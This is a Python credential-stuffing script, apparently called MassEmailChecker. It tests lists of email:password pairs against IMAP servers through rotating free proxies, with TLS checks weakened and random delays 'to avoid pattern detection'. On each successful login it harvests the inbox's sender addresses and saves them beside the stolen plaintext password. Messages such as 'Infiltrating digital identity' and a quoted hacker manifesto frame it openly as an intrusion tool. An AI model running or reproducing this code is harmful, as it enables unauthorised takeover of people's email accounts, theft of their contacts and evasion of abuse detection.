#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sat Dec 30 13:05:20 2023
@author: root
"""

import imaplib
import email
import socket
import random
from email.header import decode_header
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import smtplib
import time
import ssl
import requests


# ANSI Color Codes
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
RESET = "\033[0m"
BLINK = "\033[5m"

# Function to read credentials from a file


def read_credentials(file_path):
    """
    Read credentials from a file.

    Args:
    file_path (str): The path to the credentials file.

    Returns:
    list: A list of credentials.
    """
    credentials_list = []
    with open(file_path, 'r', encoding='utf-8') as file:
        credentials_list = [line.strip().split(':')
                            for line in file if line.strip()]
    return credentials_list

# Function to read IMAP server mappings from a file


def read_imap_server_mappings(file_path):
    """
    Read and parse IMAP server mappings from a file.

    The function expects each line in the file to be in the format:
    'domain:server:port'. It skips lines that are not in this format and counts them as errors.

    Args:
    file_path (str): The path to the file containing IMAP server mappings.

    Returns:
    tuple: A tuple containing three elements:
        - A dictionary where each key is a domain and its value is a tuple of server and port.
        - An integer representing the total number of lines read from the file.
        - An integer representing the number of lines with format errors.
    """
    imap_servers = {}
    error_count = 0
    total_lines = 0
    with open(file_path, 'r', encoding='utf-8') as file:
        for line in file:
            total_lines += 1
            if not line.strip():
                continue
            parts = line.strip().split(':')
            if len(parts) == 3:
                domain, server, port = parts
                imap_servers[domain] = (server, int(port))
            else:
                error_count += 1
                print(RED + f"Data breach in line {total_lines}: "
                      f"{line.strip()}" + RESET)

    return imap_servers, total_lines, error_count


def is_ipv4(address):
    """
    Check if the given address is a valid IPv4 address.

    Args:
    address (str): The address to check.

    Returns:
    bool: True if the address is a valid IPv4 address, False otherwise.
    """
    try:
        socket.inet_pton(socket.AF_INET, address)
        return True
    except socket.error:
        return False

# Function to read proxy server mappings from a file


def read_proxies(file_path):
    """
    Read and parse proxy configurations from a file.

    Args:
    file_path (str): The path to the file containing proxy configurations.

    Returns:
    list: A list of proxy configurations, where each configuration is a list 
    containing host and port.
    """
    proxy_list = []
    with open(file_path, 'r', encoding='utf-8') as proxy_file:
        proxy_list = [line.strip().split(':')
                      for line in proxy_file if line.strip()]
    return proxy_list


def select_random_proxy(proxies):
    """
    Select a random proxy configuration from a list of proxies.

    Args:
    proxies (list): A list of proxy configurations, where each configuration 
    is a list containing host and port.

    Returns:
    tuple: A tuple containing the selected proxy configuration (host, port).
    """
    return random.choice(proxies)


def get_imap_server(email_address, imap_servers):
    """
    Get the IMAP server and port based on the email domain.

    Args:
    email_address (str): The email address to extract the domain from.
    imap_servers (dict): A dictionary where keys are domains, and values are 
    tuples of server and port.

    Returns:
    tuple: A tuple containing the IMAP server and port for the email domain, 
    or None if not found.
    """
    domain = email_address.split('@')[1]
    return imap_servers.get(domain, None)


def proxy_request(proxy_host=None, proxy_port=None, validate_only=False):
    """
    Send a request using a proxy and optionally validate the proxy.

    Args:
    proxy_host (str, optional): The proxy host address. Default is None.
    proxy_port (int, optional): The proxy port number. Default is None.
    validate_only (bool, optional): If True, only validate the proxy without 
    making a request.

    Returns:
    bool or str or None: If validate_only is True, returns True if the proxy is 
    valid, False otherwise.
    If validate_only is False, returns the external IP 
    obtained using the proxy or None on failure.
    """
    try:
        if proxy_host and proxy_port:
            proxies = {
                'http': f'http://{proxy_host}:{proxy_port}',
                'https': f'http://{proxy_host}:{proxy_port}'
            }
        else:
            proxies = None

        response = requests.get('https://httpbin.org/ip',
                                proxies=proxies, timeout=10)

        if validate_only:
            return response.status_code == 200
        else:
            return response.json().get('origin')

    except requests.RequestException:
        return False if validate_only else None


# Paths to files
CREDENTIALS_FILE = 'credentials.txt'
IMAP_SERVER_MAPPINGS_FILE = 'imap_server_mappings.txt'
PROXY_FILE = 'proxies.txt'


# Read credentials, IMAP server mappings, and proxies from files
accounts = read_credentials(CREDENTIALS_FILE)
imap_servers, total_lines, error_count = read_imap_server_mappings(
    IMAP_SERVER_MAPPINGS_FILE)
proxies = read_proxies(PROXY_FILE)

# Initialize an empty list for valid proxies
valid_proxies = []

print(YELLOW + "Starting proxy validation process..." + RESET)

total_proxies = len(proxies)
TESTED_PROXIES = 0

# Test each proxy and filter out the bad ones
for proxy_host, proxy_port in proxies:
    if proxy_request(proxy_host, proxy_port, validate_only=True):
        valid_proxies.append(f"{proxy_host}:{proxy_port}\n")

    TESTED_PROXIES += 1
    print(f"Tested {TESTED_PROXIES}/{total_proxies} proxies.", end="\r")

# Report results of the filtering
if valid_proxies:
    print(YELLOW + f"\n{len(valid_proxies)} valid proxies found. "
          "Updating proxies.txt..." + RESET)
    with open(PROXY_FILE, 'w', encoding='utf-8') as file:
        file.writelines(valid_proxies)
    print(GREEN + "proxies.txt has been updated SUCCESSfully." + RESET)
else:
    print(RED + "\nNo valid proxies found. Please check your proxy source." + RESET)

print(YELLOW +
      f"Initiating hack sequence... Scanned {total_lines} lines, "
      f"detected {error_count} anomalies in IMAP server mappings." + RESET)


# Maximum number of proxy attempts
MAX_PROXY_ATTEMPTS = 999
ATTEMPT_NUMBER = 1  # Initialize attempt counter
LAST_DOMAIN = None


def shuffle_accounts(accounts):
    """
    Shuffles the order of accounts in the given list.

    Args:
        accounts (list): A list of account information.

    Returns:
        list: The list of accounts with a randomized order.

    Example:
        accounts = [("user1", "password1"), ("user2", "password2")]
        shuffled_accounts = shuffle_accounts(accounts)
    """
    random.shuffle(accounts)
    return accounts


accounts = read_credentials(CREDENTIALS_FILE)
accounts = shuffle_accounts(accounts)

# Process each account
for username, password in accounts:
    current_domain = username.split('@')[1]

    if current_domain == LAST_DOMAIN:
        delay = random.randint(10, 60)  # Random delay between 10 to 60 seconds
        print(
            f"Delay introduced for {delay} seconds to avoid pattern detection.")
        time.sleep(delay)
    SUCCESS = False
    LOGIN_FAILED = False  # Flag to indicate login failure
    attempted_proxies = []
    PROXY_ATTEMPTS = 0  # Initialize proxy attempt counter

    print(GREEN + f"\nInfiltrating digital identity: {username}" + RESET)

    while not SUCCESS and not LOGIN_FAILED and PROXY_ATTEMPTS < MAX_PROXY_ATTEMPTS:
        PROXY_ATTEMPTS += 1  # Increment proxy attempt counter
        proxy = select_random_proxy(proxies)

        if proxy in attempted_proxies:
            continue

        proxy_host, proxy_port = proxy
        if not is_ipv4(proxy_host):
            print(f"Skipping non-IPv4 proxy {proxy_host}")
            continue

        print(f"Attempting connection via proxy {proxy_host}:{proxy_port} "
              f"for account {username}{' ' * 10}", end='\r')

        # Set a timeout for socket operations
        socket.setdefaulttimeout(5)  # Adjusted timeout

        # Check external IP after setting the proxy
        proxy_ip = proxy_request(proxy_host, proxy_port)
        if proxy_ip is None:
            continue  # Skip the rest of the loop and try with a new proxy
        else:
            print(GREEN + f"IP after setting proxy: {proxy_ip} "
                  f"(Proxy: {proxy_host}:{proxy_port})" + RESET)

            # Continue with the rest of the script
        # Only proceed if a valid external IP is obtained
        if proxy_ip is not None:
            pass

        imap_server_info = get_imap_server(username, imap_servers)
        if not imap_server_info:
            print(
                f"IMAP server not found for {username}. Skipping this account.")
            break
        imap_server, imap_port = imap_server_info

        # Custom SSL context with lowered security
        ssl_context = ssl.create_default_context()
        ssl_context.set_ciphers('DEFAULT@SECLEVEL=1')
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

        # Attempt to connect to the IMAP server using the proxy
        try:
            mail = imaplib.IMAP4_SSL(
                imap_server, imap_port, ssl_context=ssl_context)
            print(GREEN + "Connection to the Gibson established." + RESET)
            mail.login(username, password)
            SUCCESS = True
            print(GREEN + "Hacking the Gibson SUCCESSful. We're in." + RESET)
            mail.select('INBOX')
            print(YELLOW + "Traversing to INBOX." + RESET)

            # Search for all emails in the selected mailbox
            status, messages = mail.search(None, 'ALL')
            if status != 'OK':
                print(RED + "Error scanning emails." + RESET)
                continue
            print(
                GREEN + f"Located {len(messages[0].split())} emails in the INBOX." + RESET)

            # Convert messages to a list of email IDs
            messages = messages[0].split()

            SENDERs = []
            SKIPPED_EMAILS = 0  # Initialize counter for skipped emails

            for mail_id in messages:
                # Fetch each email's header
                status, data = mail.fetch(mail_id, '(RFC822.HEADER)')
                email_msg = email.message_from_bytes(data[0][1])

                # Check if 'From' header is present
                from_header = email_msg['From']
                if from_header is None:
                    SKIPPED_EMAILS += 1
                    continue

                # Decode the email SENDER
                SENDER = decode_header(from_header)[0][0]
                if isinstance(SENDER, bytes):
                    try:
                        SENDER = SENDER.decode('utf-8')
                    except UnicodeDecodeError:
                        try:
                            SENDER = SENDER.decode('iso-8859-1')
                        except UnicodeDecodeError:
                            SENDER = 'Unknown SENDER'

                SENDERs.append(SENDER)

            # Removing duplicates and creating a summary
            unique_SENDERs = set(SENDERs)
            print(
                YELLOW + f"Uncovered {len(unique_SENDERs)} unique digital footprints." + RESET)

            # Writing unique SENDERs to a text file
            filename = f'unique_SENDERs_{username}.txt'
            with open(filename, 'w', encoding='utf-8') as file:
                # Writing credentials at the top of the file
                file.write(f"Credentials for {username}:\n"
                           f"Username: {username}\nPassword: {password}\n\n")
                # Writing unique SENDERs
                for SENDER in unique_SENDERs:
                    file.write(SENDER + '\n')

            print(GREEN + f"Extracted data saved in {filename}" + RESET)
            if SKIPPED_EMAILS > 0:
                print(RED + f"Warning: {SKIPPED_EMAILS} emails evaded detection "
                      "due to stealth headers." + RESET)

            # Logout from the server
            mail.logout()
            print(GREEN + "Disconnected from the grid. Hack the Planet.\n" + RESET)
        except imaplib.IMAP4.error as e:
            if "authentication failed" in str(e).lower():
                print(RED + f"Authentication failed for {username}. "
                      "Skipping to next account." + RESET)
                LOGIN_FAILED = True  # Set the flag to indicate login failure
                break  # Exit the while loop
            else:
                print(RED + f"IMAP Error: {e} Authentication failed for {username}. "
                      "Skipping to next account." + RESET)
                break  # Skip to the next proxy attempt

        except socket.error as e:
            print(RED + f"Socket Error: {e}" + RESET)
            continue  # Skip to the next proxy attempt
        ATTEMPT_NUMBER += 1  # Increment the attempt counter
        LAST_DOMAIN = current_domain

    else:
        if LOGIN_FAILED:
            # Login failed, skip to the next account
            print(
                RED + f"Login failed for account {username}. Skipping to next account." + RESET)
            continue
        elif PROXY_ATTEMPTS >= MAX_PROXY_ATTEMPTS:
            # Max proxy attempts reached
            print(RED + "Failed to establish proxy connection after maximum attempts. "
                  "Moving to next account." + RESET)

        # Reset the default timeout after each attempt
        socket.setdefaulttimeout(None)


def is_valid_proxy(line):
    """Check if a line is a valid proxy format (IP:Port)."""
    parts = line.split(':')
    if len(parts) == 2 and parts[1].isdigit():
        return True
    return False


def get_proxy_parameters():
    print(YELLOW + "Fetching proxies..." + RESET)
    try:
        response = requests.get(
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=anonymous")
        print(f"Response Status Code: {response.status_code}")

        if response.status_code != 200:
            print(
                RED + f"Failed to fetch proxies. Status code: {response.status_code}" + RESET)
            return []

        return response.text.splitlines()

    except requests.RequestException as error:
        print(RED + f"Error fetching proxies: {error}" + RESET)
        return []


def read_existing_proxies(filename="proxies.txt"):
    try:
        with open(filename, "r", encoding='utf-8') as file:
            return set(filter(is_valid_proxy, file.read().splitlines()))
    except FileNotFoundError:
        return set()


def save_proxies_to_file(proxies, filename="proxies.txt"):
    try:
        with open(filename, "w", encoding='utf-8') as file:
            file.write("\n".join(proxies))
        print(GREEN + f"Proxies saved to {filename}" + RESET)
    except IOError as error:
        print(RED + f"Error saving proxies to file: {error}" + RESET)


def send_notification():
    sender_email = "your_sender_email@example.com"
    receiver_email = "your_receiver_email@example.com"
    password = "your_email_password"
    smtp_server = "smtp.example.com"
    smtp_port = 587

    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = "Script Notification: Completion Status"
    body = "The MassEmailChecker script has completed its execution."

    message.attach(MIMEText(body, "plain"))

    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(sender_email, password)
    server.sendmail(sender_email, receiver_email, message.as_string())
    server.quit()


print(GREEN + "This is our world now. The world of the electron and the switch; "
      "the beauty of the baud.\n"
      "We exist without nationality, skin color, or religious bias.\n"
      "You wage wars, murder, cheat, lie to us and try to make us believe "
      "it's for our own good, yet we're the criminals.\n"
      "Yes, I am a criminal. My crime is that of curiosity.\n"
      "I am a hacker, and this is my manifesto.\n"
      "You may stop me, but you can't stop us all." + BLINK)

# Call the notification function right after the specific lines
send_notification()


# Main execution
if __name__ == "__main__":
    existing_proxies = read_existing_proxies()
    new_proxies = set(filter(is_valid_proxy, get_proxy_parameters()))
    combined_proxies = existing_proxies.union(new_proxies)
    save_proxies_to_file(combined_proxies)
